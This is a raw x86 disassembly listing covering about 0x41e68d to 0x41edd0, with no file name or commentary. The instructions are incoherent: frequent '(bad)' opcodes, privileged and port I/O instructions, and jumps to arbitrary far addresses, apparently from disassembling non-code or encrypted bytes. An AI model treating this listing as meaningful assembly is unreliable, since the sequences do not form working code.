  41e68d:	int3   
  41e68e:	and    al,0x30
  41e690:	arpl   WORD PTR [edi],di
  41e692:	jge    0x41e6f1
  41e694:	bound  ebp,QWORD PTR [edi+0x70]
  41e697:	cmp    DWORD PTR [edx-0x4b08425f],edi
  41e69d:	add    eax,edi
  41e69f:	mov    ah,0x74
  41e6a1:	in     al,dx
  41e6a2:	dec    esi
  41e6a3:	xchg   eax,ebx
  41e6a5:	or     DWORD PTR [eax+0x6372805e],ebx
  41e6ab:	retf   
  41e6ac:	test   BYTE PTR [edx+0x7f054915],al
  41e6b2:	jl     0x41e6e4
  41e6b4:	xchg   ecx,eax
  41e6b5:	mov    ecx,DWORD PTR [esi+0x7d765fe0]
  41e6bb:	iret   
  41e6bc:	xchg   BYTE PTR [ebx],cl
  41e6be:	test   bh,0x12
  41e6c1:	arpl   WORD PTR [ecx-0x4d7a1f56],di
  41e6c7:	xchg   esp,eax
  41e6c8:	or     al,0x12
  41e6ca:	cs pop ebp
  41e6cc:	fistp  DWORD PTR [eax+0x413cd1a8]
  41e6d2:	add    BYTE PTR [edx+0x2b],0xa1
  41e6d6:	pushf  
  41e6d7:	mov    al,ds:0x818b06dd
  41e6dc:	or     ah,bl
  41e6de:	and    bl,BYTE PTR [bx+di-0x695a]
  41e6e3:	hlt    
  41e6e4:	pusha  
  41e6e5:	push   es
  41e6e6:	inc    edi
  41e6e7:	je     0x41e6a3
  41e6e9:	repz jo 0x41e742
  41e6ec:	mov    esp,ss
  41e6ee:	xor    DWORD PTR [edi],esi
  41e6f0:	int    0x97
  41e6f2:	(bad)  
  41e6f4:	add    esi,ebp
  41e6f6:	xchg   edi,eax
  41e6f7:	das    
  41e6f8:	push   esp
  41e6f9:	pop    DWORD PTR [eax+0x28]
  41e6fc:	mov    esp,DWORD PTR [esi+edi*4]
  41e6ff:	imul   esi
  41e701:	js     0x41e76c
  41e703:	dec    di
  41e705:	rcl    ch,1
  41e707:	frstor [ecx]
  41e709:	aad    0x62
  41e70b:	pop    ebp
  41e70c:	(bad)  
  41e70d:	sub    BYTE PTR [edx+0x48],ch
  41e710:	cmp    eax,0x9d8cb0d
  41e715:	mov    eax,ds:0x97377843
  41e71a:	aas    
  41e71b:	xor    DWORD PTR [ecx+eiz*2],ecx
  41e71e:	cmp    BYTE PTR [edx-0xd5565e7],bl
  41e724:	adc    ebx,DWORD PTR [edi]
  41e726:	inc    ecx
  41e727:	jbe    0x41e71f
  41e729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e72a:	pandn  mm7,QWORD PTR [edi]
  41e72d:	xchg   BYTE PTR [esi+edx*2+0x13],bl
  41e731:	jbe    0x41e791
  41e733:	and    al,0x50
  41e735:	push   edx
  41e736:	je     0x41e6c2
  41e738:	push   cs
  41e739:	cmp    eax,0xa6eb036a
  41e73e:	add    BYTE PTR [edi-0x5f],ah
  41e741:	out    dx,eax
  41e742:	xor    bl,BYTE PTR [edx]
  41e744:	jle    0x41e6dc
  41e746:	test   al,0x1b
  41e748:	in     al,dx
  41e749:	dec    esp
  41e74a:	push   0xffffffa8
  41e74c:	ror    DWORD PTR [edi+0x51374914],0xa0
  41e753:	ret    
  41e754:	loope  0x41e74b
  41e756:	lods   al,BYTE PTR ds:[esi]
  41e757:	adc    al,0xf2
  41e759:	pop    ecx
  41e75a:	xor    bl,bh
  41e75c:	shl    BYTE PTR [edx-0x2712c030],cl
  41e762:	aad    0xb0
  41e764:	push   ebx
  41e765:	(bad)  
  41e766:	loopne 0x41e728
  41e768:	in     eax,0x22
  41e76a:	jne    0x41e71e
  41e76c:	(bad)  
  41e76d:	jle    0x41e719
  41e76f:	ror    DWORD PTR [ecx+0x75cc9b60],cl
  41e775:	fbstp  TBYTE PTR [edi+0xb]
  41e778:	jmp    0x1d7f:0x4a51d0dd
  41e77f:	jecxz  0x41e778
  41e781:	push   esi
  41e782:	fst    QWORD PTR [ebx-0x34]
  41e785:	fnstcw WORD PTR [edx-0x69]
  41e788:	dec    esp
  41e789:	cld    
  41e78a:	push   es
  41e78b:	bound  edx,QWORD PTR [ebp-0x756c597e]
  41e791:	ror    bh,0xac
  41e794:	mov    al,0x70
  41e796:	fld    QWORD PTR [edx-0x7c]
  41e799:	pop    edx
  41e79a:	enter  0xbbc0,0x40
  41e79e:	pop    esp
  41e79f:	repz adc al,cl
  41e7a2:	pop    ds
  41e7a3:	lock out 0x54,al
  41e7a6:	inc    esi
  41e7a7:	and    eax,0x48f6b5b
  41e7ac:	add    eax,esi
  41e7ae:	ror    eax,cl
  41e7b0:	scas   al,BYTE PTR es:[edi]
  41e7b1:	fs mov bh,ah
  41e7b4:	mov    ds:0x4bc57491,eax
  41e7b9:	in     al,0xae
  41e7bb:	pop    edx
  41e7bc:	les    esi,FWORD PTR [esi+0x9]
  41e7bf:	or     edx,DWORD PTR [esi-0x117bd391]
  41e7c5:	jecxz  0x41e76e
  41e7c7:	(bad)  
  41e7c9:	xor    BYTE PTR [ecx],cl
  41e7cb:	iret   
  41e7cc:	pop    ss
  41e7cd:	jecxz  0x41e7f4
  41e7cf:	(bad)  
  41e7d0:	xor    DWORD PTR [ecx],eax
  41e7d2:	loope  0x41e79a
  41e7d4:	add    edx,DWORD PTR [edi]
  41e7d6:	nop
  41e7d7:	fistp  QWORD PTR [ecx+0x309d956]
  41e7dd:	cmp    ebx,eax
  41e7df:	mov    bl,0x6c
  41e7e1:	repnz repnz cmc 
  41e7e4:	test   ch,ch
  41e7e6:	jle    0x911c39d1
  41e7ec:	(bad)  [edi]
  41e7ee:	sahf   
  41e7ef:	push   eax
  41e7f0:	mov    bl,0x40
  41e7f2:	jp     0x41e795
  41e7f4:	popf   
  41e7f5:	dec    ebp
  41e7f6:	js     0x41e84c
  41e7f8:	cmovo  esi,DWORD PTR [eax+edi*2+0x6b45edfa]
  41e800:	xchg   ecx,eax
  41e801:	int3   
  41e802:	retf   
  41e803:	mov    ah,0xcc
  41e805:	and    edi,ebp
  41e807:	push   ecx
  41e808:	mov    edi,0xd7f0f95e
  41e80d:	adc    DWORD PTR [ebp-0x7e4f90d],ebx
  41e813:	(bad)  
  41e814:	cmp    DWORD PTR [ebp+0x16],eax
  41e817:	xor    ch,BYTE PTR [ebp-0x1b]
  41e81a:	enter  0xceb8,0xba
  41e81e:	xor    edi,DWORD PTR [edi]
  41e820:	sub    al,0xe2
  41e822:	test   al,0xf9
  41e824:	sub    BYTE PTR [esi+0x37],ah
  41e827:	retf   
  41e828:	pop    ebp
  41e829:	(bad)  
  41e82a:	fbld   TBYTE PTR [ecx]
  41e82c:	jne    0x41e7f1
  41e82e:	dec    eax
  41e82f:	das    
  41e830:	mov    ebx,0xdb2d5829
  41e835:	and    ah,cl
  41e837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e838:	lods   eax,DWORD PTR ds:[esi]
  41e839:	fisttp QWORD PTR [edi]
  41e83b:	mov    eax,0xbb9e30f2
  41e840:	add    dl,BYTE PTR [ebx]
  41e842:	int3   
  41e843:	je     0x41e828
  41e845:	in     eax,dx
  41e846:	push   eax
  41e847:	cmp    al,0x56
  41e849:	adc    bl,bl
  41e84b:	push   ds
  41e84c:	imul   ebx,DWORD PTR [ebp-0x13],0xc4d86b4c
  41e853:	mov    ebx,0x149e870c
  41e858:	rcr    DWORD PTR [edi-0x7fbb592c],0x13
  41e85f:	push   ebp
  41e860:	xor    DWORD PTR [ecx+0x6cbe9d4c],esi
  41e866:	clc    
  41e867:	(bad)  
  41e868:	add    BYTE PTR [ecx-0x1ceba336],ch
  41e86e:	inc    edx
  41e86f:	in     eax,0xdc
  41e871:	xchg   ebp,eax
  41e872:	outs   dx,BYTE PTR ds:[esi]
  41e873:	dec    edx
  41e874:	jb     0x41e859
  41e876:	je     0x41e8b6
  41e878:	jb     0x41e878
  41e87a:	test   al,0x6c
  41e87c:	ret    
  41e87d:	fidivr DWORD PTR [edi-0x7b]
  41e880:	jae    0x41e8a9
  41e882:	fucomi st,st(1)
  41e884:	jns    0x41e8ef
  41e886:	scas   al,BYTE PTR es:[di]
  41e888:	test   BYTE PTR [eax],dl
  41e88a:	dec    ebp
  41e88b:	sub    ch,BYTE PTR [esi]
  41e88d:	jp     0x41e829
  41e88f:	dec    esi
  41e890:	aaa    
  41e891:	arpl   WORD PTR [edi+edi*4+0x5404f785],si
  41e898:	sub    al,0x77
  41e89a:	rep outs dx,DWORD PTR ds:[esi]
  41e89c:	dec    edi
  41e89d:	jns    0x8e8c5a6f
  41e8a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8a4:	fistp  WORD PTR ds:0x15ef6615
  41e8aa:	dec    ecx
  41e8ab:	aam    0x78
  41e8ad:	and    eax,0x93e38ca
  41e8b2:	dec    ebx
  41e8b3:	sbb    eax,0x14a8bff9
  41e8b8:	mov    ah,0xb9
  41e8ba:	shl    esp,0xc3
  41e8bd:	test   al,0x32
  41e8bf:	push   esp
  41e8c0:	push   ss
  41e8c1:	sahf   
  41e8c2:	fcomip st,st(4)
  41e8c4:	jae    0x41e93c
  41e8c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8c7:	inc    edx
  41e8c8:	push   ecx
  41e8c9:	aad    0xf6
  41e8cb:	pop    es
  41e8cc:	addr16 je 0x41e8e2
  41e8cf:	jmp    0xe9cba8bb
  41e8d4:	jmp    0xd7e8:0x57394514
  41e8db:	mov    bh,0x50
  41e8dd:	mov    dl,0xab
  41e8df:	ror    BYTE PTR [ebx+0x787b3835],cl
  41e8e5:	int3   
  41e8e6:	push   cs
  41e8e7:	xor    al,0xce
  41e8e9:	rcr    DWORD PTR [ecx-0x73],0xf6
  41e8ed:	bound  eax,QWORD PTR [eax-0x69]
  41e8f0:	cmp    ebp,DWORD PTR [eax]
  41e8f2:	adc    eax,eax
  41e8f4:	loopne 0x41e8b5
  41e8f6:	fild   QWORD PTR [ebp+0x55]
  41e8f9:	mov    bh,0xf6
  41e8fb:	or     al,0xf6
  41e8fd:	push   ds
  41e8fe:	mov    ebx,0xe312ddcc
  41e903:	sti    
  41e904:	cmp    al,0x93
  41e906:	ja     0x9038dc26
  41e90c:	loop   0x41e954
  41e90e:	aam    0xb3
  41e910:	ds mov al,0xf7
  41e913:	fs inc ecx
  41e915:	cmp    al,0xd1
  41e917:	pop    esp
  41e918:	popf   
  41e919:	arpl   WORD PTR [ebx],ax
  41e91b:	inc    DWORD PTR [edi-0x72]
  41e91e:	outs   dx,DWORD PTR ds:[esi]
  41e91f:	arpl   WORD PTR [esi-0x40],sp
  41e922:	(bad)  
  41e923:	pop    ds
  41e924:	loop   0x41e924
  41e926:	pop    ecx
  41e927:	jmp    DWORD PTR [ebx]
  41e929:	fs jns 0x41e964
  41e92c:	fcomp  QWORD PTR [esi+0xc]
  41e92f:	mov    ds:0xab4aceb,eax
  41e934:	call   0xe274:0x24935ec
  41e93b:	jbe    0x41e8e5
  41e93d:	push   ebp
  41e93e:	aad    0x5
  41e940:	iret   
  41e941:	lea    ebp,[ebx]
  41e943:	sti    
  41e944:	or     eax,0xbd11e422
  41e949:	xor    DWORD PTR [eax-0x80],ebp
  41e94c:	sbb    ah,dh
  41e94e:	jns    0x41e93d
  41e950:	push   0xa62eb726
  41e955:	loope  0x41e8e4
  41e957:	outs   dx,DWORD PTR ds:[esi]
  41e958:	sub    esi,ebx
  41e95a:	bnd jno 0x41e8ed
  41e95d:	xor    ecx,0xffffffda
  41e960:	dec    edi
  41e961:	jmp    0x56e4:0xcb5a72ab
  41e968:	and    eax,0x6adbff8
  41e96d:	aaa    
  41e96e:	nop
  41e96f:	pop    ss
  41e970:	push   cs
  41e971:	bnd ret 0xcdcc
  41e975:	lods   al,BYTE PTR ds:[esi]
  41e976:	add    bh,BYTE PTR [ecx+0x6]
  41e979:	shr    BYTE PTR [ebx-0x4e],1
  41e97c:	push   cs
  41e97d:	jae    0x41e9e0
  41e97f:	sbb    eax,0x8e4ef5f4
  41e984:	cmp    al,0x44
  41e986:	icebp  
  41e987:	imul   esi,eax,0x4a
  41e98a:	xchg   esp,eax
  41e98b:	hlt    
  41e98c:	add    ecx,ebp
  41e98e:	ret    0x65fe
  41e991:	sbb    eax,0x252d6263
  41e996:	retf   0xdf43
  41e999:	test   al,0x69
  41e99b:	cdq    
  41e99c:	lods   al,BYTE PTR ds:[esi]
  41e99d:	mov    al,BYTE PTR [edx+0x2e902cac]
  41e9a3:	xchg   DWORD PTR [edx+0x6],eax
  41e9a6:	cwde   
  41e9a7:	and    esp,DWORD PTR [ebx-0x4831e337]
  41e9ad:	fisubr DWORD PTR [esi]
  41e9af:	jmp    0x41e9eb
  41e9b1:	fwait
  41e9b2:	mov    dl,0xee
  41e9b4:	jns    0x41e983
  41e9b6:	xlat   BYTE PTR ds:[ebx]
  41e9b7:	mov    esp,edi
  41e9b9:	adc    eax,0x4df7a367
  41e9be:	pushf  
  41e9bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9c0:	pop    es
  41e9c1:	dec    esp
  41e9c2:	or     eax,ebx
  41e9c4:	fs add ebp,ecx
  41e9c7:	mov    bh,BYTE PTR [edx-0x4f]
  41e9ca:	lods   eax,DWORD PTR ds:[esi]
  41e9cb:	add    ah,BYTE PTR [ebp-0x70]
  41e9ce:	leave  
  41e9cf:	bnd cs call 0xd7795b26
  41e9d6:	sub    al,0xe2
  41e9d8:	xor    DWORD PTR [ebx],edi
  41e9da:	and    BYTE PTR [ecx-0x4285c67e],dl
  41e9e0:	xchg   edi,esi
  41e9e2:	mov    ebp,0xb5e01aa4
  41e9e7:	hlt    
  41e9e8:	push   ds
  41e9e9:	adc    DWORD PTR [esi+esi*1+0x49],0x53
  41e9ee:	mov    dh,0x70
  41e9f0:	cmp    edx,ecx
  41e9f2:	cs out dx,eax
  41e9f4:	fdivr  QWORD PTR [ebx-0x469f4533]
  41e9fa:	in     al,dx
  41e9fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9fc:	je     0x41ea7a
  41e9fe:	xor    eax,0xb14c77ff
  41ea03:	push   ebp
  41ea04:	cmp    al,0xe2
  41ea06:	jge    0x41ea64
  41ea08:	pop    edx
  41ea09:	in     al,dx
  41ea0a:	pop    ebx
  41ea0b:	mov    ebx,0x9a6b7d2a
  41ea10:	cmp    BYTE PTR [ebx+0xf916823],bl
  41ea16:	or     eax,0x78e38b3b
  41ea1b:	in     eax,0x9b
  41ea1d:	stos   DWORD PTR es:[edi],eax
  41ea1e:	dec    esi
  41ea1f:	sbb    al,0xf2
  41ea21:	xchg   edi,eax
  41ea22:	call   0x7945:0x3e9dcf39
  41ea29:	sar    bl,cl
  41ea2b:	xchg   esp,eax
  41ea2c:	repz cmp eax,0xad7bd9e3
  41ea32:	ins    BYTE PTR es:[edi],dx
  41ea33:	mov    bl,BYTE PTR [esi-0x2e]
  41ea36:	xor    ecx,DWORD PTR [ecx+0x3c]
  41ea39:	xor    al,0x5d
  41ea3b:	mov    bl,0x80
  41ea3d:	mov    dl,0xf4
  41ea3f:	xor    eax,0xb96feb02
  41ea44:	sti    
  41ea45:	ffreep st(1)
  41ea47:	jl     0x41ea99
  41ea49:	test   BYTE PTR [ecx+0x2a1c6da1],ch
  41ea4f:	adc    BYTE PTR [ebx+edx*8],dh
  41ea52:	aas    
  41ea53:	mov    WORD PTR cs:[esi+0x4597f6fe],?
  41ea5a:	lds    edx,FWORD PTR [edi+edx*8+0x32]
  41ea5e:	aaa    
  41ea5f:	pop    esp
  41ea60:	inc    ebp
  41ea61:	mov    esp,0xa0039464
  41ea66:	ret    0x9513
  41ea69:	aad    0x5e
  41ea6b:	pop    esi
  41ea6c:	jmp    0xddf8:0x50f06ccc
  41ea73:	mov    ah,0xc2
  41ea75:	scas   eax,DWORD PTR es:[edi]
  41ea76:	pop    ds
  41ea77:	leave  
  41ea78:	sbb    BYTE PTR [esi-0x47],ah
  41ea7b:	push   ebx
  41ea7c:	cmc    
  41ea7d:	jno    0x41ea5c
  41ea7f:	push   esi
  41ea80:	rol    DWORD PTR [ebx-0x2d7d0c8a],cl
  41ea86:	arpl   WORD PTR [eax+0x618865f],sp
  41ea8c:	mov    bh,0x6a
  41ea8e:	sub    eax,0xd31076d3
  41ea93:	cmp    ebp,edi
  41ea95:	dec    esp
  41ea96:	sub    al,0x99
  41ea98:	cdq    
  41ea99:	popa   
  41ea9a:	jl     0x41eac2
  41ea9c:	add    edx,ebx
  41ea9e:	inc    esi
  41ea9f:	xor    eax,0xa24e69a4
  41eaa4:	lea    esp,[esi+0x36]
  41eaa7:	cmc    
  41eaa8:	cmp    BYTE PTR [edx+0xef5d4fa],cl
  41eaae:	add    eax,0xbafced4b
  41eab3:	imul   esp,DWORD PTR [eax],0x45
  41eab6:	mov    ecx,0xa4d0a04c
  41eabb:	jmp    0x41eae6
  41eabd:	pop    ebp
  41eabe:	jbe    0x41ea46
  41eac0:	jb     0x41ead1
  41eac2:	js     0x41ea6c
  41eac4:	push   ds
  41eac5:	adc    eax,0x2967926
  41eaca:	in     al,dx
  41eacb:	push   ebp
  41eacc:	sbb    al,0xba
  41eace:	repz jecxz 0x41ea67
  41ead1:	mov    edx,0xfb173ce2
  41ead6:	mov    ds:0xdb2e9f40,al
  41eadb:	xchg   edx,eax
  41eadc:	pop    ds
  41eadd:	inc    esi
  41eade:	cmp    BYTE PTR [edi-0x2d],ah
  41eae1:	stos   DWORD PTR es:[edi],eax
  41eae2:	push   ds
  41eae3:	jge    0x41ea8e
  41eae5:	out    dx,eax
  41eae6:	enter  0x6189,0x24
  41eaea:	xor    eax,0xf50439fc
  41eaef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eaf0:	pushf  
  41eaf1:	icebp  
  41eaf2:	push   edx
  41eaf3:	aam    0x5
  41eaf5:	ja     0x41ea8c
  41eaf7:	adc    BYTE PTR [edx+edx*8+0x5b],dh
  41eafb:	cs inc ebx
  41eafd:	add    cl,bh
  41eaff:	stos   BYTE PTR es:[edi],al
  41eb00:	in     al,0xe6
  41eb02:	test   al,0xb6
  41eb04:	ss scas al,BYTE PTR es:[edi]
  41eb06:	mov    edx,0x2bcf46c1
  41eb0b:	repz or al,0x7f
  41eb0e:	sbb    esp,ebx
  41eb10:	push   ebx
  41eb11:	xchg   esp,eax
  41eb12:	ret    0xf283
  41eb15:	bound  ebp,QWORD PTR [edi+0xb319310]
  41eb1b:	xchg   edi,eax
  41eb1c:	pop    esp
  41eb1d:	cdq    
  41eb1e:	push   es
  41eb1f:	push   esp
  41eb20:	xor    BYTE PTR [edx],bl
  41eb22:	lahf   
  41eb23:	mov    bh,0x10
  41eb25:	push   edx
  41eb26:	or     esi,ebp
  41eb28:	test   al,0x89
  41eb2a:	cs fwait
  41eb2c:	std    
  41eb2d:	nop
  41eb2e:	xchg   ebp,eax
  41eb2f:	mov    edi,0x4c74ebbe
  41eb34:	in     eax,0x87
  41eb36:	and    BYTE PTR [ecx-0x38],al
  41eb39:	ins    BYTE PTR es:[edi],dx
  41eb3a:	cwde   
  41eb3b:	lahf   
  41eb3c:	push   0x919d7e30
  41eb41:	call   0xb00a8522
  41eb46:	les    edi,FWORD PTR [edx+0x1d]
  41eb49:	jbe    0x41eb07
  41eb4b:	lods   eax,DWORD PTR ds:[esi]
  41eb4c:	ds stos BYTE PTR es:[edi],al
  41eb4e:	ds jmp 0x89bd:0xcdf26ec2
  41eb56:	int3   
  41eb57:	xor    eax,0x50d85500
  41eb5c:	mov    ch,0x4c
  41eb5e:	mov    eax,ds:0xc248cbc2
  41eb63:	test   DWORD PTR [ecx+0x3b],edx
  41eb66:	or     al,0xb2
  41eb68:	test   eax,0x9e5959b9
  41eb6d:	ja     0x41eb2d
  41eb6f:	dec    esp
  41eb70:	or     cl,BYTE PTR [ebp+ecx*2+0x6a]
  41eb74:	pushf  
  41eb75:	push   ss
  41eb76:	in     eax,0xea
  41eb78:	mov    edi,0x89dcbbb8
  41eb7d:	xlat   BYTE PTR ds:[ebx]
  41eb7e:	sub    eax,0xef5275f2
  41eb83:	and    al,0x3f
  41eb85:	sub    al,0x50
  41eb87:	xchg   ebp,eax
  41eb88:	push   ecx
  41eb89:	mov    bl,0x8b
  41eb8b:	inc    edx
  41eb8c:	sti    
  41eb8d:	or     al,0x3
  41eb8f:	int3   
  41eb90:	js     0x41ebcc
  41eb92:	sub    esi,esp
  41eb94:	(bad)  
  41eb95:	lahf   
  41eb96:	inc    ecx
  41eb97:	cs push es
  41eb99:	add    al,0xf0
  41eb9b:	push   esp
  41eb9c:	hlt    
  41eb9d:	inc    ecx
  41eb9e:	xor    BYTE PTR [edi+eiz*2-0x69],ch
  41eba2:	push   ebx
  41eba3:	push   esi
  41eba4:	(bad)  
  41eba5:	ror    BYTE PTR [esi+edx*2-0x3c],1
  41eba9:	jmp    0x41ebca
  41ebab:	inc    ecx
  41ebac:	into   
  41ebad:	retf   
  41ebae:	dec    ecx
  41ebaf:	(bad)
  41ebb2:	pop    ecx
  41ebb3:	clc    
  41ebb4:	or     dh,cl
  41ebb6:	sub    edi,eax
  41ebb8:	test   BYTE PTR [edx-0x19],dh
  41ebbb:	loope  0x41eb7c
  41ebbd:	jnp    0x41ebad
  41ebbf:	fwait
  41ebc0:	mov    ds:0x1093bfd0,eax
  41ebc5:	inc    ecx
  41ebc6:	rcr    DWORD PTR [esp+eax*8+0x12],cl
  41ebca:	cwde   
  41ebcb:	dec    edi
  41ebcc:	xchg   BYTE PTR [esi+eax*2],dh
  41ebcf:	push   0xbb7a3d41
  41ebd4:	ins    DWORD PTR es:[edi],dx
  41ebd5:	sbb    eax,0xe19f4ba
  41ebda:	or     esp,DWORD PTR [edi+ebx*2+0x454d8efb]
  41ebe1:	call   eax
  41ebe3:	xchg   DWORD PTR fs:[eax],edi
  41ebe6:	jmp    0x8289f696
  41ebeb:	pop    ecx
  41ebec:	(bad)  
  41ebed:	cs xchg ecx,eax
  41ebef:	adc    bl,BYTE PTR [edi-0x37]
  41ebf2:	call   0x6891:0x11f9c55a
  41ebf9:	out    0x91,al
  41ebfb:	dec    ecx
  41ebfc:	sub    ah,dl
  41ebfe:	or     edx,DWORD PTR [edx+0x71d44ab6]
  41ec04:	shl    BYTE PTR [esi+0x63],1
  41ec07:	xor    DWORD PTR [ebx],ecx
  41ec09:	jp     0x41ebce
  41ec0b:	pushf  
  41ec0c:	jo     0x41ebd6
  41ec0e:	fsubr  st(0),st
  41ec10:	adc    edx,DWORD PTR [ecx+0x55fe1afc]
  41ec16:	jno    0x41ebc8
  41ec18:	fnsave [ecx]
  41ec1a:	rcr    bh,0xfc
  41ec1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec1e:	aad    0x95
  41ec20:	ret    
  41ec21:	inc    ebx
  41ec22:	adc    DWORD PTR [eax-0x4c3668ff],edx
  41ec28:	inc    edi
  41ec29:	push   ss
  41ec2a:	pop    esp
  41ec2b:	loope  0x41ec8c
  41ec2d:	stos   BYTE PTR es:[edi],al
  41ec2e:	cmp    cl,BYTE PTR [eax+0x58]
  41ec31:	arpl   WORD PTR [ebx-0xe],di
  41ec34:	and    eax,0x42df4ead
  41ec39:	sbb    DWORD PTR [ebx-0x17b12d4f],edx
  41ec3f:	(bad)  
  41ec40:	inc    BYTE PTR [edx-0x5c]
  41ec43:	mov    ch,BYTE PTR [eax+ebx*2]
  41ec46:	stos   DWORD PTR es:[edi],eax
  41ec47:	push   ebx
  41ec48:	mov    eax,0xcf69576
  41ec4d:	or     eax,0x73bd84ab
  41ec52:	sbb    eax,0xa3a50bd4
  41ec57:	test   BYTE PTR [edi-0x4a],0xe7
  41ec5b:	cmp    dh,dh
  41ec5d:	das    
  41ec5e:	cmp    edi,DWORD PTR [edi]
  41ec60:	push   es
  41ec61:	or     dl,dh
  41ec63:	jle    0x41ecb9
  41ec65:	mov    BYTE PTR [ebp-0x12f91b17],ah
  41ec6b:	push   edi
  41ec6c:	scas   eax,DWORD PTR es:[edi]
  41ec6d:	jmp    0xd57d3872
  41ec72:	(bad)  
  41ec73:	lahf   
  41ec74:	mov    bh,0x1c
  41ec76:	ret    
  41ec77:	sbb    ah,BYTE PTR [edi-0x39]
  41ec7a:	scas   eax,DWORD PTR es:[edi]
  41ec7b:	push   cs
  41ec7c:	adc    eax,0xc61c9aac
  41ec81:	mov    dh,0xa3
  41ec83:	test   eax,0x2237bbe3
  41ec88:	sub    edi,DWORD PTR [eax-0x80]
  41ec8b:	jl     0x41ed05
  41ec8d:	das    
  41ec8e:	and    eax,0x2f6236f1
  41ec93:	aad    0x5f
  41ec95:	hlt    
  41ec96:	mov    eax,ds:0xff38bfd6
  41ec9b:	xchg   edi,eax
  41ec9c:	je     0x41ecc3
  41ec9e:	dec    ebp
  41ec9f:	mov    bl,0xb4
  41eca1:	push   edi
  41eca2:	pop    ebx
  41eca3:	or     BYTE PTR [esi],ah
  41eca5:	mov    ecx,0x6973f2f0
  41ecaa:	or     BYTE PTR [ebp+0x58],0xa1
  41ecae:	in     eax,0x4e
  41ecb0:	call   0x26ce:0xa995091
  41ecb7:	sbb    al,0xcc
  41ecb9:	lahf   
  41ecba:	out    dx,eax
  41ecbb:	out    0xb2,eax
  41ecbd:	add    eax,0x1abee8e7
  41ecc2:	aad    0x85
  41ecc4:	push   ebx
  41ecc5:	or     DWORD PTR [ebx+0x5fb923be],edx
  41eccb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eccc:	(bad)  
  41eccd:	div    esi
  41eccf:	cmp    BYTE PTR [ecx-0x59],cl
  41ecd2:	(bad)  
  41ecd4:	call   0x1603:0xfd15f266
  41ecdb:	cld    
  41ecdc:	xchg   ecx,eax
  41ecdd:	inc    esi
  41ecde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecdf:	cmp    ch,dh
  41ece1:	mov    dl,0xfb
  41ece3:	and    BYTE PTR [esi],bl
  41ece5:	mov    bh,BYTE PTR [ebx-0xc]
  41ece8:	inc    ebp
  41ece9:	ret    0xbf70
  41ecec:	add    bh,BYTE PTR [esi+0xd4cba32]
  41ecf2:	jg     0x41ed63
  41ecf4:	imul   ecx,DWORD PTR [ebx-0x63],0x64
  41ecf8:	in     al,dx
  41ecf9:	pop    ds
  41ecfa:	loope  0x41ed64
  41ecfc:	inc    edi
  41ecfd:	jecxz  0x41ecd0
  41ecff:	sub    al,0x49
  41ed01:	inc    ebp
  41ed02:	add    DWORD PTR [esi+0x2b0d403b],edi
  41ed08:	push   0xffffff8a
  41ed0a:	jmp    0x41ece7
  41ed0c:	cs data16 jns 0x41ed5a
  41ed10:	pop    esi
  41ed11:	js     0x41ed89
  41ed13:	dec    edx
  41ed14:	(bad)  
  41ed15:	push   esi
  41ed17:	sub    eax,0xbecd604b
  41ed1c:	ins    BYTE PTR es:[edi],dx
  41ed1d:	repnz mov WORD PTR [edx+0x60],ds
  41ed21:	xor    al,cl
  41ed23:	popa   
  41ed24:	mov    ds:0xb6fa83bd,al
  41ed29:	fxch   st(6)
  41ed2b:	sub    edx,DWORD PTR [edi]
  41ed2d:	mov    edi,0xc5b79f56
  41ed32:	pop    ebp
  41ed33:	xchg   ecx,eax
  41ed34:	jae    0x41ed9d
  41ed36:	mov    edi,0x4702c17d
  41ed3b:	jno    0x41ecfe
  41ed3d:	dec    ecx
  41ed3e:	lea    edx,[eax]
  41ed40:	repz push edi
  41ed42:	xchg   ebx,eax
  41ed43:	mov    dl,BYTE PTR [edx+0x223b6d75]
  41ed49:	repz pop ebx
  41ed4b:	inc    ebx
  41ed4c:	mov    ebx,DWORD PTR [esi+0xa76e787]
  41ed52:	push   ebp
  41ed53:	push   ebp
  41ed54:	xchg   ebx,eax
  41ed55:	ins    DWORD PTR es:[edi],dx
  41ed56:	push   esp
  41ed57:	sbb    dl,bl
  41ed59:	push   ss
  41ed5a:	mov    bh,0xb9
  41ed5c:	push   0x1
  41ed5e:	arpl   WORD PTR [edx+0x637c8eac],di
  41ed64:	repz sar DWORD PTR [ebp+0x35aeb176],1
  41ed6b:	scas   al,BYTE PTR es:[edi]
  41ed6c:	(bad)  
  41ed6e:	xor    esi,DWORD PTR [ecx+ebx*4]
  41ed71:	xor    DWORD PTR [ecx+0x75],0x5ea1c3b7
  41ed78:	std    
  41ed79:	add    ch,dl
  41ed7b:	daa    
  41ed7c:	addr16 xchg edx,eax
  41ed7e:	jp     0x41ed4a
  41ed80:	fnstcw WORD PTR [ebx+0x51]
  41ed83:	pushf  
  41ed84:	pop    esi
  41ed85:	inc    eax
  41ed86:	int    0xa5
  41ed88:	xchg   edi,eax
  41ed89:	in     al,dx
  41ed8a:	stc    
  41ed8b:	mov    ah,0xdf
  41ed8d:	push   0x266d245
  41ed92:	or     DWORD PTR [ebx+0x318fc9e6],ebx
  41ed98:	cmp    dl,0xee
  41ed9b:	sub    BYTE PTR [ecx-0x29105a71],ch
  41eda1:	cld    
  41eda2:	ret    0xacb6
  41eda5:	dec    ebp
  41eda6:	push   edx
  41eda7:	dec    ecx
  41eda8:	push   ss
  41eda9:	push   cs
  41edaa:	pop    es
  41edab:	test   ebp,edi
  41edad:	ja     0x41edf3
  41edaf:	faddp  st(1),st
  41edb1:	pop    esp
  41edb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edb3:	add    DWORD PTR [ecx+0x4a],ebp
  41edb6:	imul   ecx,eax,0xfbfec4da
  41edbc:	gs push eax
  41edbe:	mov    dh,0x48
  41edc0:	xchg   BYTE PTR [edx-0x41],dh
  41edc3:	es mov dh,0xc8
  41edc6:	cmp    al,BYTE PTR [esi-0x76]
  41edc9:	fstp   TBYTE PTR [ecx*1+0x3a087027]
  41edd0:	lock data16 jp 0x41ede0
